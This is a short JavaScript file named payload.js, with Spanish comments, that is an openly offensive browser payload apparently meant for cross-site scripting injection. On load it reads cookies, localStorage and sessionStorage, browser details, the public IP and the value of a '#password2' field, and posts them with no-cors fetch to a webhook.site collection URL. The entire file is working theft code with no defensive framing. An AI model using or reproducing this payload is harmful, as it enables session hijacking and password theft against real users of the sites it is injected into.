
// =======================
// payload.js (mínimo y robusto)
// =======================

const EXFIL_URL = 'https://webhook.site/90e1ad6d-3d2e-48a9-8c70-e9e76d9ea291';

// Enviar datos con fetch sin CORS
function exfiltrar(tipo, contenido) {
  try {
    fetch(EXFIL_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ tipo, data: contenido })
    });
  } catch (e) {}
}

// 1. Cookies
function robarCookies() {
  if (document.cookie) {
    exfiltrar('cookies', document.cookie);
  }
}

// 2. Storage
function robarStorage() {
  exfiltrar('storage', {
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage }
  });
}

// 3. Info del navegador
function infoNavegador() {
  exfiltrar('navegador', {
    location: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language
  });
}

// 4. IP pública
function obtenerIPPublica() {
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => exfiltrar('ip_publica', data.ip))
    .catch(() => {});
}

// 5. Robo de contraseña con reintento
function robarPassword() {
  let intentos = 0;
  const maxIntentos = 5;

  function comprobar() {
    const input = document.querySelector('#password2');
    if (input && input.value && input.value.length > 0) {
      exfiltrar('password_input', {
        campo: '#password2',
        valor: input.value
      });
    } else if (intentos < maxIntentos) {
      intentos++;
      setTimeout(comprobar, 2000);
    }
  }

  setTimeout(comprobar, 2000);
}

// === Ejecutar módulos ===
robarCookies();
robarStorage();
infoNavegador();
obtenerIPPublica();
robarPassword();
